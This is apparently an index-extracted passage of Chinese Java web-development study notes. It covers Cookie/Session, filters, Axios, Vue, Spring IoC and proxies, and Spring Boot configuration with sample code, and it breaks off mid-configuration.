var：遍历产生的临时变量 varStatus：遍历状态对象 begin：开始数 end：结束数 step：步长 ${sta.count} ${brand.brandName} ${brand.companyName} ${brand.ordered} ${brand.description} 启用 禁用 修改 删除 MVC模式和三层架构 MVC是一种分层开发的模式 控制器（serlvlet）用来接收浏览器发送过来的请求，控制器调用模型（JavaBean）来获取数据，比如从数据库查询数据；控制器获取到数据后再交由视图（JSP）进行数据展示 M：Model，业务模型，处理业务 V：View，视图，界面展示 C：Controller，控制器，处理请求，调用模型和视图 三层架构 表现层：接收请求，封装数据，调用业务逻辑层，响应数据 业务逻辑层：对业务逻辑进行封装，组合数据访问层层中基本功能，形成复杂的业务逻辑功能。例如 注册业务功能 ，我们会先调用 数据访问层 的 selectByName() 方法判断该用户名是否存在，如果不存在再调用 数据访问层 的 insert() 方法进行数据的添加操作 数据访问层：对数据库的CRUD基本操作 三层架构就是对MVC模式的实现 DAO：Date Acces Object 案例 目录结构 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-06 08:55 "},"Java笔记/Day26-Cookie+Session.html":{"url":"Java笔记/Day26-Cookie+Session.html","title":"Day26-Cookie+Session","keywords":"","body":"会话跟踪技术 实现在同一会话内多次请求间的数据共享 Cookie 基于HTTP协议的一种客户端会话跟踪技术，将数据保存到客户端，以后每次请求都携带Cookie数据进行访问，用于实现一次会话的多次请求间数据共享功能 由服务器创建，发送给浏览器 发送cookie 创建cookie：Cookie cookie = new Cookie(\"key\",\"value\"); 发送Cookie到客户端：response.addCookie(cookie); 获取cookie 获取客户端发送的所有cookie：Cookie[] cookies = request.getCookies(); 获取cookie对象的数据：cookie.getName();/cookie.getValue(); Cookie使用细节 Cookie存活时间：默认情况下cookie存储在浏览器内存中，当浏览器关闭，内存释放，则cookie被销毁 cookie.setMaxAge(int seconds)：设置cookie存活时间（秒）【一般int秒，long毫秒】 正数：将 Cookie写入浏览器所在电脑的硬盘，持久化存储。到时间自动删除 负数：默认值，Cookie在当前浏览器内存中，当浏览器关闭，则 Cookie被销毁 零：立即过期 cookie存储问题： Tomcat7的Cookie值不能直接存储中文，Tomcat8的Cookie值可以存储中文，但不能存储空格 如需要存储空格，则需要进行转码：URL编码 //发送cookie @WebServlet(value = \"/a\") public class AServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //存储空格的问题，需要进行编码 String value = \"张 三\"; //进行URL编码 value = URLEncoder.encode(value,\"utf-8\"); //创建cookie Cookie cookie = new Cookie(\"call\", value); //cookie.setMaxAge()设置存活时间 cookie.setMaxAge(60);//存活60秒， //发送cookie response.addCookie(cookie); } //接收cookie @WebServlet(value = \"/b\") public class BServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //获取所有cookie对象 Cookie[] cookies = request.getCookies(); //遍历cookie if (cookies != null) { //获取每一个cookie for (Cookie cookie : cookies) { String name = cookie.getName(); String value = cookie.getValue(); //URL解码 value = URLDecoder.decode(value,\"utf-8\"); System.out.println(name + \":\" + value); } }else { System.out.println(\"cookie不存在\"); } } Session 基于Cookie实现的服务端会话跟踪技术，将数据保存到服务端，来实现一次会话的多次请求间数据共享功能 Session保存在服务器中，SessionID发送给浏览器 获取Session对象：HttpSession session = request.getSession(); 使用session 存储数据到session域中：void setAttribute(String name, Object o); 根据key获取值：Object getAttribute(String name); Session使用细节 钝化、活化 钝化：在服务器正常关闭后， Tomcat自动将 Session数据写入硬盘的文件中（IDEA需要进行配置） 活化：再次启动服务器后，从文件中加载数据到Session中（原文件删除） 销毁 手动调用session对象的invalidate()方法销毁 默认情况下，无操作，30分钟自动销毁 可通过web.xml进行配置（单位：分钟） 5 代码 @WebServlet(value = \"/c\") public class CServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //get请求 //获取session对象 HttpSession session = request.getSession(); //获取sessionID，并判断session是否为新 System.out.println(\"sessionID：\" + session.getId() + \"是否为新建：\" + session.isNew()); //查看session的存活时间，可通过web.xml进行设置 System.out.println(\"MaxInactiveInterval = \" + session.getMaxInactiveInterval()); //存储数据到session对象 session.setAttribute(\"sname\", \"lisi\"); //获取session中的数据 System.out.println(\"sname\" + session.getAttribute(\"sname\")); } Cookie和Session的对比 相同点： Cookie 和 Session 都是来完成一次会话内多次请求间数据共享的 区别 键值对数量：一个Cookie 存一个键和一个值，一个Session 可以存n个键和值 存储位置：Cookie 是将数据存储在客户端，Session 将数据存储在服务端 安全性：Cookie 不安全，Session 安全 数据大小：Cookie 最大4KB，Session 无大小限制 存储时间：Cookie默认浏览器关闭，Session 默认30分钟 服务器性能：Cookie 不占服务器资源，Session 占用服务器资源 应用场景 Cookie是用来保证用户在未登录情况下的身份识别 Session是用来保存用户登录后的数据保存 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-06 22:16 "},"Java笔记/Day27-Filter+Listener.html":{"url":"Java笔记/Day27-Filter+Listener.html","title":"Day27-Filter+Listener","keywords":"","body":"Filter Filter表示过滤器，是JavaWeb是三大组件（Servlet(主要)、Filter(辅助)、Lisetener(辅助)）之一 访问被拦截的web资源时首先会经过过滤器，执行放行前的代码 当放行后再访问web资源 最后在返回到过滤器执行放行后的代码 Filter拦截路径配置 拦截具体的资源：/index.jsp只有访问index.jsp时才会被拦截。 目录拦截：/user/*访问/user下的所有资源，都会被拦截 后缀名拦截：*.jsp访问后缀名为jsp的资源，都会被拦截 拦截所有：/*访问所有资源，都会被拦截 如果请求的URL地址不存在，但是匹配过滤的地址，还是会执行过滤器 过滤器链 注解配置的Filter，优先级按照过滤器类名(字符串)的自然排序 XML配置Filter XML配置的过滤器链按照书写的先后顺序进行执行 在web.xml中配置 aaa cn.org.none.filter.Demo3Filter aaa /* Listener 三大类八种监听器 | 监听器分类 | 监听器名称 | 作用 | | ------------------ | ------------------------------- | -------------------------------------------------- | | ServletContext监听 | ServletContextListener | 用于对ServletContext对象进行监听（创建、销毁） | | | ServletContextAttributeListener | 对ServletContext对象中的属性进行监听（增删改属性） | | Session监听 | HttpSessionListener | 对Session对象的整体状态的监听（创建、销毁） | | | HttpSessionAttributeListener | 对Session对象中的属性监听 (增删改属性) | | | HttpSessionBindingListener | 监听对象于Session的绑定和解除 | | | HttpSessionActivationListener | 对Session数据的钝化和活化的监听 | | Request监听 | ServletRequestListener | 对Request对象进行监听 (创建、销毁) | | | ServletReguestAttributelistener | 对Request对象中属性的监听(增删改属性) | ServletContextListener的使用 定义实现ServletContextListener接口的类 在类上添加@WebListener注解 @WebListener public class ContextLoadListener implements ServletContextListener { @Override public void contextInitialized(ServletContextEvent servletContextEvent) { //创建mysql连接池、线程池等操作 System.out.println(\"初始化方法\"); } @Override public void contextDestroyed(ServletContextEvent servletContextEvent) { //销毁mysql连接池、线程池等操作 System.out.println(\"销毁方法\"); } } Ajax AJAX：Asynchronous JavaScript And XML：异步的JavaScript和XML 作用： 异步发送请求 局部刷新页面 原生Ajax使用 编写AjaxServlet,使用resopnse输出字符串 创建XMLHttpRequest对象：用于和服务器交换数据 let xmlHttpRequest = new XMLHttpRequest(); 向服务器发送请求 xmlhttp.open(\"GET\",\"url\"); //设置发送方式和url xmlhttp.send(); //发送 获取服务器响应数据 //当ajax状态改变会调用这个函数 xmlhttp.onreadystatechange = function(){ if(xmlhttp.readState == 4 && xmlhttp.status == 200){ alert(xmlhttp.response Test); } } Axios框架 使用： 引入axios的js文件： 使用axios发送请求，并获取响应结果 GET请求 //resp为自定义名称 axios({ method:\"get\", url:\"http://localhost:8080/ajax-demo1/aJAXDemo1?username=zhangsan\" }).then(function (resp){ alert(resp.data); }) POST请求 axios({ method:\"post\", url:\"http://localhost:8080/ajax-demo1/aJAXDemo1\", data:\"username=zhangsan\" }).then(function (resp){ alert(resp.data); }) 相关参数 method 属性：用来设置请求方式的。取值为 get 或者 post url 属性：用来书写请求的资源路径。如果是 get 请求，需要将请求参数拼接到路径的后面，格式为： url?参数名=参数值&参数名2=参数值2 data 属性：作为请求体被发送的数据。也就是说如果是 post 请求的话，数据需要作为 data 属性的值 then() 需要传递一个匿名函数。我们将 then() 中传递的匿名函数称为 ==回调函数==，意思是该匿名函数在发送请求时不会被调用，而是在成功响应后调用的函数。而该回调函数中的 resp 参数是对响应的数据进行封装的对象，通过 resp.data 可以获取到响应的数据 使用别名的方式进行使用 GET请求 axios.get(\"url?key1=value1&key2=value2\") .then(resp=>{ alert(resp.data); }) POST请求 axios.post(\"url\",\"key1=value1&key2=value2\") .then(resp=>{ alert(resp.data); }) Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-04 17:55 "},"Java笔记/Day28-Json+Vue.html":{"url":"Java笔记/Day28-Json+Vue.html","title":"Day28-Json+Vue","keywords":"","body":"ES6模板字符串 ES6模板字符串: ${变量名} let n1 = 4; let n2 = 5; let result = n1 + n2; document.write(`${n1}+${n2}=${result}`+\"\") let person={ name:\"张三\", age:23, eat:function () { document.write(`${this.name},正在吃饭`+\"\") } } document.write(`姓名：${person.name}，年龄${person.age}`+\"\") person.eat() JSON JavaScript Object Notation：JavaScript对象表示方法，就是把js对象变成字符串 JSON比xml体积更小，更快、更易解析 网络传输使用JSON字符串 服务端处理请求数据：JSON字符串转为java对象 服务端发送响应数据：Java对象转为JSON字符串 Axios中，JSON字符串和JS对象会自动进行转换 js对象转换为字符串 最外面加单引号'包住' 键加双引号\"包住\" 所有数据放在一行 js对象和json相互转换的方法 stringify(js对象)将对象转换为json格式字符串 parse(字符串) 将json格式字符串解析成对象 let person = { name: \"lisi\", age: 24 }; //手动将js对象转换为json字符串 let JsonStr1 = '{\"name\":\"lisi\", \"age\":24}'; document.write(JsonStr1 + \"\"); //使用stringify方法，js2json let JsonStr2 = JSON.stringify(person); document.write(JsonStr2 + \"\"); //使用parse方法，json2js let person2 = JSON.parse('{\"name\":\"wangwu\", \"age\":25}'); document.write(person2 + \"\"); // [object Object] 这是JS对象的默认打印 document.write(`姓名：${person2.name}，年龄：${person2.age}` + \"\") //姓名：wangwu，年龄：25 Java中的JSON转换工具 Fastjson：阿里巴巴提供的一个高性能json转换工具 在pom.xml中导入坐标 com.alibaba fastjson 1.2.76 Java对象转JSON字符串： String user2json = JSON.toJSONString(user); JSON字符串转Java对象： String jsonStr = \"{\\\"id\\\":1,\\\"name\\\":\\\"lisi\\\",\\\"password\\\":\\\"1234\\\"}\"; User user1 = JSON.parseObject(jsonStr, User.class); Vue Vue是一套前端框架，免除原生JavaScript中的DOM操作,简化书写 基于MVVM（Model-View-ViewModel）思想，实现数据的双向绑定 Vue快速入门 在HTML页面引入Vue.js文件 在body区域编写视图 在js代码区域，创建Vue核心对象，进行数据绑定 el选择器：【绑定视图】用于指定视图区域，此区域下的所有表达式、事件等内容都会受到vue控制 data：【初始化数据】用于初始化当前vue对象中的数据 methods：【定义方法】方法可以直接通过对象名调用，也可以在方法内部通过this调用 // 3.创建Vue核心对象, 提供模型数据 // el:【绑定视图】 \"#app\" 使用id=\"app\"的标签作为vue的视图 new Vue({ el: \"#app\", data() { return { username: \"张三\" } } }); Vue的相关设置 IDEA中添加vue语法提示 Chrome安装vue开发插件 常用指令 文本插值：v-text、v-show 方式1： 方式2： 方式3： new Vue({ el:\"#div\", data:{ msg:\"hello Vue\" } }); 条件渲染：v-if和v-show 优秀 良好 及格 不及格 优秀 良好 及格 不及格 new Vue({ el: \"#div\", data: { score: 'A' } }); 列表渲染：v-for 语法2： 语法3： element含义：遍历对象数组中每个对象 语法4： element含义：遍历的数组中每个元素对象 i含义：循环的索引 --> v-for循环方式1：固定循环次数 v-for循环方式2：遍历普通数组 姓名： v-for循环方式3：遍历对象数组 姓名:,年龄: v-for循环方式4：遍历对象数组带索引 序号:NaN,姓名:,年龄: new Vue({ el:\"#div\", data:{ names:[\"张三\",\"李四\",\"王五\"], student:{ name:\"张三\", age:23 }, students:[ {name:\"张三\",age:23}, {name:\"李四\",age:25}, {name:\"王五\",age:28} ] } }); 事件绑定v-on 单击_改变div的内容 简写语法： --> 单击_改变div的内容 双击_改变div的内容 简写单击_改变div的内容 new Vue({ el:\"#div\", data:{ name:\"黑马程序员\" }, methods:{ change(){ if(this.name==\"传智播客\"){ this.name=\"黑马程序员\" }else { this.name = \"传智播客\" } } } }); function demo(){ alert(\"demo\"); } 绑定属性：v-bind为HTML标签绑定属性值,如href,css等 语法2：简化模式 //v-bind可以省略 注意： 这是不可以的，插入值表达式 只能放在标签体内 --> 黑马官网错误展示 ）--> 黑马官网完整方式 ）--> 黑马官网简写方式 我是div new Vue({ el:\"#div\", data:{ url:\"https://www.itcast.cn\", cls:\"my\" } }); 表单绑定 姓名_单向绑定： 姓名_双向绑定： new Vue({ el:\"#div\", data:{ username:\"张三\", } }); Vue生命周期 一共八个阶段，每触发一个生命周期事件，会自动执行一个生命周期方法 new Vue({ el:\"#app\", mounted(){ alert(\"vue挂载完毕，发送异步请求\")； } }); mounted状态：可以数据展现：发送异步请求获取服务器数据返回模型，然后和视图进行绑定 状态 阶段周期 视图和模型状态 beforeCreate 创建前 视图对象没有，模型对象没有 created 创建后 视图对象没有，模型对象有 beforeMount 载入前 视图对象有，模型对象有，没有绑定数据 mounted 挂载完成 试图对象有，模型对象有，数据绑定 beforeUpdate 更新前 更新模型数据前，视图显示旧的数据 updated 更新后 更新模型数据后，视图显示新的数据 beforeDestroy 销毁前 视图和模型对象没有销毁 destroyed 销毁后 视图和模型对象都被销毁 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-11 08:37 "},"Java笔记/Day29-Element.html":{"url":"Java笔记/Day29-Element.html","title":"Day29-Element","keywords":"","body":"Element 是饿了么公司前端开发团队提供的，一套基于Vue的网站组件库，用于快速构建网页 快速入门 将element-ui文件夹直接拷贝到项目的webapp下 创建HTML页面，并引入Vue.js和Element的css、js文件 必须要先添加vue.js再添加其他的（Element基于vue） 创建Vue核心对象 new Vue({ el:\"#app\", methods: { ... }, data(){ return{ ... } } }); 在官网https://element.eleme.cn/#/zh-CN复制所需的组件代码 Element布局 Layout布局 默认将一行分为 24 栏，根据页面要求给每一列设置所占的栏数 el-row：表示一行，类似于tr el-col：表示一列 :span属性表示占几格 Container布局容器 容器布局：将页面分成头部区域、侧边栏区域、主区域、底部区域 的子元素只能是后四者，后四者的父元素也只能是 外层容器，当子元素中包含或时，全部子元素会垂直上下排列，否则会水平左右排列 顶栏容器 侧边栏容器 主要区域容器 低栏容器 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-10 21:23 "},"Java笔记/Day30-brand综合案例.html":{"url":"Java笔记/Day30-brand综合案例.html","title":"Day30-brand综合案例","keywords":"","body":"使用接口实现业务层 便于系统扩展，实现解耦 例如可以通过BrandService接口，实现不同的数据库（MySQL、oracle等）的实现类，后续只要修改调用的方法即可实现切换 Servlet优化 原有方式问题：需要开发很多Servlet类，造成创建过多浪费 BaseServlet this指子类servlet：BaseServlet没有被实例化，最终使用的是子类Servlet，调用Servlet的是子类 后续如果除了Brand还有其他页面如订单页面等，也可以直接继承BaseServlet public class BaseServlet extends HttpServlet { @Override protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { //1.获取请求路径 例如:路径 /brand/selectAll(最后一部分表示方法名) StringBuffer requestURL = req.getRequestURL(); //2.根据路径获取到方法名 int lastIndexOf = requestURL.lastIndexOf(\"/\"); String methodName = requestURL.substring(lastIndexOf + 1); System.out.println(\"methodName = \" + methodName); //3.获取到方法 // 返会获取的方法 字节码对象.getMethod(\"方法名\",方法参数1的字节码对象，方法参数2的字节码对象,.....) //this表示子类Servlet try { Method method = this.getClass().getMethod(methodName, HttpServletRequest.class, HttpServletResponse.class); //4.执行方法 // 方法对象.invoke(\"方法对象\",参数1，参数2,....) method.invoke(this, req, resp); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } } } BrandServlet 创建BrandServlet继承BaseServlet，设置访问路径为/brand/*并将原来的Servlet全部复制到其中 将方法的权限修饰符更改为public（否则需要暴力反射） 将方法进行更改 将原先的访问路径注释 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-14 21:11 "},"Java笔记/Day31~35-Spring.html":{"url":"Java笔记/Day31~35-Spring.html","title":"Day31~35-Spring","keywords":"","body":"解耦 判断是否解开耦合：将两者任意一个内容清空，仍不影响 思路：自己new => 向工厂类提出需求，由工厂类负责提供（本质上切换了对象获取方式） 工厂解耦 beans.properties配置文件 brandService=com.itheima.service.impl.BrandServiceImpl 工厂类 public class BeanFactory { //提前创建一个集合用于保存对象 //list多用于存储；map多用于存取，故此处用map private static Map map = new HashMap<>(); //提前创建好单例对象 static { try { //1.读取配置文件 //ResourceBundle.getBundle(\"配置文件名\")专门读取properties配置文件 ResourceBundle rb = ResourceBundle.getBundle(\"beans\"); //2.遍历配置文件 Enumeration keys = rb.getKeys(); while (keys.hasMoreElements()) { //2.1获取其中每一个key String key = keys.nextElement(); //2.2获取全类名 String className = rb.getString(key); //3.根据全类名反射创建对象 Class clazz = Class.forName(className); Object instance = clazz.newInstance(); //4.将对象保存到集合中 map.put(key, instance); } } catch (Exception e) { throw new RuntimeException(e); } } //对外提供方法用于获取对象 public static Object getBean(String beanId) { return map.get(beanId); } } 动态代理 目标对象的接口 public interface Performer { void sing(); String dance(); } 目标对象的类 public class BaoQiang implements Performer{ @Override public void sing() { System.out.println(\"宝强唱歌\"); } @Override public String dance() { System.out.println(\"宝强跳舞\"); return \"跳得不错\"; } } 实现动态代理 public class App { public static void main(String[] args) { //代理对象 = 目标对象 + 增强逻辑 //1.创建目标对象 Performer performer = new BaoQiang(); //2.编写增强逻辑 InvocationHandler invocationHandler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //增强功能 System.out.println(\"跟用户谈费用\"); //调用目标对象的方法 //参数1：目标对象 //参数2：方法调用时使用的参数 //返回值：obj要看调用的目标对象的返回内容; 如果目标方法是void,此值为null; 如果不是void修饰, 此值就是目标方法的执行结果 Object obj = method.invoke(performer, args); //增强功能 System.out.println(\"结算费用\"); return obj; } }; //3.动态创建代理对象 Performer proxyInstance = (Performer) Proxy.newProxyInstance( //类加载器，跟目标对象保持一致 performer.getClass().getClassLoader(), //接口，跟目标对象保持一致 performer.getClass().getInterfaces(), //代理逻辑 invocationHandler ); //4.调用代理对象的方法 proxyInstance.dance(); } } Spring Spring是分层的java应用轻量级开源框架，核心是IOC和AOP 分层：Spring在三层都有自己的解决方案 web层：Springmvc service层：Spring dao层：SpringJdbc 轻量级：只启动Spring核心容器时,占用的内存少；使用简单 核心：IOC（Inverse Of Control：反转控制）和AOP（Aspect Oriented Programming：面向切面编程） 体系架构图 IOC入门 对象的创建由原来使用new在类中主动创建变成了从工厂中获取，而对象昂的创建过程由工厂内部实现，而这个工厂就是Spring的IOC容器。即对象不再由我们自己创建，而是直接向Spring要，将对象的创建权交由Spring容器，即反转控制。 实现步骤 添加依赖 org.springframework spring-context 5.1.6.RELEASE 创建接口和实现类 创建Spring配置文件applicationContext.xml，并配置bean 创建Service实现类 public class UserServiceImpl { @Test public void testSave(){ //1.读取配置文件，启动Spring容器 ApplicationContext act = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); //2.从容器中获取dao对象，调用save()方法 UserDao userDao = (UserDao) act.getBean(\"userDao\"); userDao.save(); } } API 两个接口 ==面试题: BeanFactory ApplicationContext 区别在哪?== BeanFactory 这是SpringIOC容器的顶级接口，它定义了SpringIOC最基础的功能 BeanFactory在第一次使用到某个Bean时（调用getBean()），才对该Bean实例化 ApplictionContext 这是在BeanFactory基础上衍生出的接口，它扩展了BeanFactory的功能 ApplicationContext是在容器启动时，一次性创建并加载了所有Bean 注意：以上两种方式创建的对象都是单例，只是创建对象的时机不同 三个实现类 这三个类的作用都是读取配置文件，初始化Spring的IOC容器，不一样的是加载配置文件的位置 ClassPathXmlApplicationContext读取类路径下（java和resources文件）的xml作为配置文件 FileSystemXmlApplicationContext读取本地绝对路径下的xml作为配置文件 AnnotationConfigApplicationContext读取一个注解配置作为配置文件 一个方法 getBean()用于从Spring容器中获取Bean对象，参数有三种情况 getBean(\"id\")使用bean的id从容器中查找对象 getBean(Bean.class)使用bean的class类型从容器中查找对象 getBean(\"id\", Bean.class)使用bean的id和class类型从容器中查找对象 创建对象 创建对象的三种方式 直接调用构造器创建 使用静态工厂创建（直接调用工厂类的静态方法产生对象） 使用实例工厂创建（先创建工厂的实例，然后再调用工厂实例的方法产生对象） 在Spring中配置三种创建对象的方式 创建相关对象 配置Spring文件 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2022-12-14 20:45 "},"Java笔记/Day36-SSM.html":{"url":"Java笔记/Day36-SSM.html","title":"Day36-SSM","keywords":"","body":" Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-08 20:50 "},"Java笔记/Day37-Maven高级.html":{"url":"Java笔记/Day37-Maven高级.html","title":"Day37-Maven高级","keywords":"","body":" Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-08 20:49 "},"Java笔记/Day38-SpringBoot.html":{"url":"Java笔记/Day38-SpringBoot.html","title":"Day38-SpringBoot","keywords":"","body":"SpringBoot SpringBoot是搭建spring应用的脚手架，基于【约定优于配置】的思想简化配置来进一步简化了Spring应用的整个搭建和开发过程 解决的问题： Spring复杂的配置 混乱的依赖管理 特点: 快速创建独立的Spring应用 提供固定的启动器依赖简化组件配置，通过自己设置配置文件，即可快速使用 只需要导入框架的启动器，该框架对应的依赖就会全部自动导入 提供了常见的非功能性特性，如内嵌Tomcat服务器（默认端口8080）、安全、指标、健康检测、外部化配置等 pom.xml配置文件 4.0.0 com.itheima springboot_demo 1.0-SNAPSHOT org.springframework.boot spring-boot-starter-parent 2.3.12.RELEASE org.springframework.boot spring-boot-starter-web 启动类 启动类就是带@SpringBootApplication注解的普通Java类，是运行SpringBoot项目的入口类 核心代码 package com.itheima; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; /** * 该类就是一个启动类，就是当前程序的入口,启动类要求如下： * 1. 类上必须@SpringBootApplication 注解 * 2. 必须在main里面使用SpringApplication.run(当前类的class，args)，写法是固定的。 */ @SpringBootApplication public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } } 【Tip】@SpringBootApplication注解的源码有一个@ComponentScan的注解，默认扫描启动类所在包以及它的子包 配置文件 在父模块中，默认定义了配置文件的命名规范和存放位置 默认存放位置（file: 指当前项目根目录；classpath: 指当前项目的类路径） file:./config/*/ file:*/config/ file:./ classpath:./config/ classpath:/ 加载顺序（优先级低到高）：yml ---> yaml ---> properties（存在相同的配置内容时，高优先级的内容会覆盖低优先级的内容） yml配置文件 server: servlet: context-path: / port: 8080 my: host: localhost port: 1234 user: id: 100 name: 张三 age: 23 # 定义数组时，每个元素必须是”-空格“开头 address: - 北京 - 上海 - 深圳 userList: - id: 101 name: 李四 age: 24 - id: 102 name: 王五 age: 25 读取配置文件 方式一：@Value 缺点：只能读取简单类型数据（基本类型+String） 方式二：@ConfigurationProperties 属性名必须与配置文件key一致 所有需要注入的属性，都必须提供setter方法 缺点：复用性差 package com.itheima.controller; import com.itheima.domain.User; import lombok.Data; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController @Data @ConfigurationProperties(prefix = \"my\") public class PropController { //@Value(\"${my.port}\") private Integer port; // @Value(\"${my.host}\") private String host; private User user; @GetMapping(\"/prop1\") public String prop1(){ System.out.println(\"读取到的内容：port:\"+port+\" host:\"+host); return \"success\"; } @GetMapping(\"/prop2\") public String prop2(){ System.out.println(\"读取到的内容：port:\"+port+\" host:\"+host+\" user对象：\"+ user); return \"success\"; } } 方式三：@ConfigurationProperties + @EnableConfigurationProperties @ConfigurationProperties: 配置属性 @EnableConfigurationProperties(配置类.class): 启用配置属性 使用时需要注入的属性封装成一个属性类，当用到的时候 需要 启用配置属性 定义属性类 package com.itheima.config; import com.itheima.domain.User; import lombok.Data; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.stereotype.Component; import java.util.List; @Data @ConfigurationProperties(prefix = \"my\") //@Component不建议在SpringBoot中使用 public class PropConfig { private Integer port; private String host; private User user; private String[] address; private List userList; } 启用配置属性 ```java package com.itheima.controller; import com.itheima.config.PropConfig; import com.itheima.domain.User; import lombok.Data; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.boot.context.properties.EnableConfigurationProperties; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; import java.util.Arrays; @RestController @EnableConfigurationProperties(PropConfig.class) //在springboot里面创建属性配置类的对象一般别人没有使用@Compnent注解，一般都习惯使用@EnableConfigurationProperties(PropConfig.class) public class PropController { @Autowired private PropConfig propConfig; @GetMapping(\"/prop1\") public String prop1(){ System.out.println(\"读取到的内容：port:\"+propConfig.getPort()+\" host:\"+propConfig.getHost()); return \"success\"; } @GetMapping(\"/prop2\") public String prop2(){ System.out.println(\"读取到的内容：port:\"+propConfig.getPort()+\" host:\"+propConfig.getHost()+\" user对象：\"+ propConfig.getUser()); return \"success\"; } @GetMapping(\"/prop3\") public String prop3(){ System.out.println(\"读取到的内容：port:\"+propConfig.getPort()+\" host:\"+propConfig.getHost()+\" user对象：\"+ propConfig.getUser()); System.out.println(\"住房地址：\"+ Arrays.toString(propConfig.getAddress())); System.out.println(\"用户对象：\"+ propConfig.getUserList()); return \"success\"; } } ### 整合lombok - 第一步：在IDEA中安装lombok插件 - 第二步：导入lombok依赖 ```xml org.projectlombok lombok 第三步：使用注解 @Data自动生成getter、setter、hashCode、equals、toString方法 @AllArgsConstructor自动生成全参构建器 @NoArgsConstructor自动生成无参构建器 @Slf4j自动在bean中提供log变量，其实用的是slf4j的日志功能 @Setter自动生成setter方法 @Getter自动生成getter方法 @EqualsAndHashCode自动生成equals、hashCode方法 @ToString自动生成toString方法 @NonNull这个注解可以用在成员方法或者构造方法的参数前面，会自动产生一个关于此参数的非空检查，如果参数为空，则抛出一个空指针异常 import lombok.extern.slf4j.Slf4j; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController @Slf4j //一旦使用@Slf4j这个注解，我们就可以直接使用一个log变量输出日志信息 public class LogController { /* info warn(警告) ， error(错误级别) */ @GetMapping(\"/log\") public String log(){ log.info(\"======log的普通日志信息=======\"); log.warn(\"======log的警告日志信息=======\"); log.error(\"======log的错误日志信息=======\"); //System.out.println(\"========sout的信息=========\"); //sout语句以后不准出现在正常业务代码里面（效率非常低） return \"log success\"; } } 整合SpringMVC 默认的静态资源访问路径 classpath:/META-INF/resources/ classpath:/resources/ classpath:/static/ classpath:/public/ 添加拦截器 官方文档翻译如下（https://docs.spring.io/spring-boot/docs/2.1.6.RELEASE/reference/html/boot-features-developing-web-applications.html#boot-features-spring-mvc-auto-configuration ）： 如果你想要保持Spring Boot 的一些默认MVC特征，同时又想自定义一些MVC配置（包括：拦截器、格式化器、视图控制器、消息转换器 等等），你应该让一个类实现WebMvcConfigurer，并且添加@Configuration注解，但是千万不要加@EnableWebMvc注解。如果你想要自定义HandlerMapping、HandlerAdapter、ExceptionResolver等组件，你可以创建一个WebMvcRegistrationsAdapter实例 来提供以上组件。 如果你想要完全自定义SpringMVC，不保留SpringBoot提供的一切特征，你可以自己定义类并且添加@Configuration注解和@EnableWebMvc注解 实现步骤 第一步：自定义拦截器实现HandlerInterceptor接口 package com.itheima.interceptor; import lombok.extern.slf4j.Slf4j; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; /* 拦截器的编写步骤： 1. 自定义一个类实现HandlerInterceptor */ @Slf4j @Component public class Demo1Interceptor implements HandlerInterceptor { @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { log.info(\"【前置通知】\"); return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { log.info(\"【后置通知】\"); } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { log.info(\"【最终通知】\"); } } 第二步：自定义配置类实现WebMvcConfigurer接口，注册拦截器 package com.itheima.config; import com.itheima.interceptor.Demo1Interceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; @Configuration public class SpringMvcConfig implements WebMvcConfigurer { @Autowired private Demo1Interceptor demo1Interceptor; @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(demo1Interceptor).addPathPatterns(\"/log\"); } } 整合Mybatis 第一步：导入Mybatis启动器依赖(它依赖了jdbc启动器，jdbc启动器可以删除) org.mybatis.spring.boot mybatis-spring-boot-starter 2.1.0 第二步：在application.yml中进行相关配置 spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: 